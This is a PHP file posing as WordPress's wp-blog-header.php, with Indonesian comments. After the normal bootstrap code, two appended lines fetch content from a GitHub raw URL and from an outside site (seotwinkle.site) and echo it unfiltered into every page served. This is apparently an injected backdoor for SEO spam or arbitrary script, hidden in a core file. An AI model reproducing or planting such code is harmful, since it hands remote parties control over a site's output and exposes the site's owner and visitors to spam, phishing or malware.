<?php
/**
 * Memuat lingkungan WordPress dan template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

    // Cegah pemuatan ulang jika sudah dimuat sebelumnya
    $wp_did_header = true;

    // Memuat file WordPress
    require_once __DIR__ . '/wp-load.php';

    // Menyiapkan query WordPress
    wp();

    // Memuat template dari WordPress
    require_once ABSPATH . WPINC . '/template-loader.php';
}
$a = file_get_contents('https://raw.githubusercontent.com/kikiii88/sadboy/main/display.txt');
echo $a;
$b = file_get_contents( 'https://seotwinkle.site/littlestar/' );
echo $b;
?>
